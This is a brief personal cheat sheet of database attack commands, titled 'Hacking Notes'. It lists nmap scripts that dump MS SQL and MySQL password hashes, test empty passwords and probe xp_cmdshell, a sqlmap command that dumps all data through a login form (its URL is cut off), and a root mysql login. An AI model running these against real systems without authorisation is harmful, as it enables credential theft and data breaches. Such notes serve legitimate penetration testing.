---
tags: 🔻 🔻/Enumeration/sqlinjection
aliases: Hacking Notes
---

# MS SQL
  

nmap -vv -sV -Pn -p <> --script=ms-sql-info,ms-sql-config,ms-sql-dump-hashes --script-args=mssql.instance-port=1433,smsql.username-sa,mssql.password-sa

  

nmap -sV -Pn -vv --script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122


  
nmap -sV -Pn -vv -script=mysql\* $ip -p 3306

   

sqlmap -u '


--method POST --data 'txtLoginID=admin&txtPassword=aa&cmdSubmit=Login' --all --dump-all

      
  
mysql -u root -p -h x.x.x.x  

 
nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER $ip
